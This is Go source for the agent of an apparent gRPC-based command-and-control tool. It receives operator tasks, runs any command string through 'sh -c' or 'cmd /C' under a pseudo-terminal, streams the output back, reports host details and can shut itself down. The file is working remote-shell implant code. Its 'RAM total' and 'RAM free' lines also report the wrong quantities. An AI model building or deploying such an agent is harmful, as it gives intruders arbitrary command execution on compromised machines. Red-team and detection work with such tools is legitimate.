package main

import (
	"bufio"
	"context"
	"errors"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"runtime"
	"syscall"
	"time"

	pb "github.com/ardhptr21/c2-grpc/pb"
	"github.com/creack/pty"
)

func executeTask(task *pb.Task) {
	command := task.GetCommand()
	args := task.GetArgs()
	agentID, _, outputClient := currentSession()

	stream, err := outputClient.SendOutput(context.Background())
	if err != nil {
		log.Printf("[agent] output stream error: %v", err)
		return
	}

	sendChunk := func(chunk string) {
		if err := stream.Send(&pb.OutputChunk{
			TaskId:  task.GetTaskId(),
			AgentId: agentID,
			Line:    chunk,
		}); err != nil {
			log.Printf("[agent] output send error: %v", err)
		}
	}

	sendChunk("")

	switch command {
	case "sysinfo":
		var mem runtime.MemStats
		runtime.ReadMemStats(&mem)
		info := []string{
			fmt.Sprintf("Hostname: %s", hostnameOrUnknown()),
			fmt.Sprintf("Platform: %s", runtime.GOOS),
			fmt.Sprintf("Arch: %s", runtime.GOARCH),
			fmt.Sprintf("CPUs: %d", runtime.NumCPU()),
			fmt.Sprintf("RAM total: %d MB", bToMB(mem.Sys)),
			fmt.Sprintf("RAM free: %d MB", bToMB(mem.Frees)),
			fmt.Sprintf("Uptime: %s", time.Since(startTime).Truncate(time.Second)),
		}
		for _, line := range info {
			sendChunk(line + "\n")
		}
	case "kill":
		sendChunk("Shutting down agent. Goodbye.\n")
		if _, err := stream.CloseAndRecv(); err != nil {
			log.Printf("[agent] output close error: %v", err)
		}
		unregisterCurrentAgent()
		os.Exit(0)
	default:
		fullCommand := command
		if args != "" {
			fullCommand += " " + args
		}

		var cmd *exec.Cmd
		if runtime.GOOS == "windows" {
			cmd = exec.Command("cmd", "/C", fullCommand)
		} else {
			cmd = exec.Command("sh", "-c", fullCommand)
		}

		if runtime.GOOS == "windows" {
			runWithPipe(cmd, sendChunk)
		} else {
			runWithPTY(cmd, sendChunk)
		}
	}

	if _, err := stream.CloseAndRecv(); err != nil {
		log.Printf("[agent] output close error: %v", err)
	}
}

func runWithPipe(cmd *exec.Cmd, sendChunk func(string)) {
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		sendChunk(fmt.Sprintf("Error creating stdout pipe: %v\n", err))
		return
	}

	cmd.Stderr = cmd.Stdout
	if err := cmd.Start(); err != nil {
		sendChunk(fmt.Sprintf("Error starting command: %v\n", err))
		return
	}

	scanner := bufio.NewScanner(stdout)
	for scanner.Scan() {
		sendChunk(scanner.Text() + "\n")
	}
	if err := scanner.Err(); err != nil {
		sendChunk(fmt.Sprintf("Error reading command output: %v\n", err))
	}
	if err := cmd.Wait(); err != nil {
		sendChunk(fmt.Sprintf("Command exited with error: %v\n", err))
	}
}

func runWithPTY(cmd *exec.Cmd, sendChunk func(string)) {
	if cmd.Env == nil {
		cmd.Env = os.Environ()
	}
	cmd.Env = append(cmd.Env, "TERM=xterm-256color")

	ptmx, err := pty.Start(cmd)
	if err != nil {
		sendChunk(fmt.Sprintf("Error starting command: %v\n", err))
		return
	}
	defer func() { _ = ptmx.Close() }()

	buf := make([]byte, 1024)
	for {
		n, err := ptmx.Read(buf)
		if n > 0 {
			sendChunk(string(buf[:n]))
		}
		if err != nil {
			if err == io.EOF || errors.Is(err, syscall.EIO) {
				break
			}
			sendChunk(fmt.Sprintf("\nError reading command output: %v\n", err))
			break
		}
	}

	if err := cmd.Wait(); err != nil {
		sendChunk(fmt.Sprintf("\nCommand exited with error: %v\n", err))
	}
}

func hostnameOrUnknown() string {
	hostname, err := os.Hostname()
	if err != nil {
		return "unknown"
	}
	return hostname
}

func bToMB(v uint64) uint64 {
	return v / 1024 / 1024
}
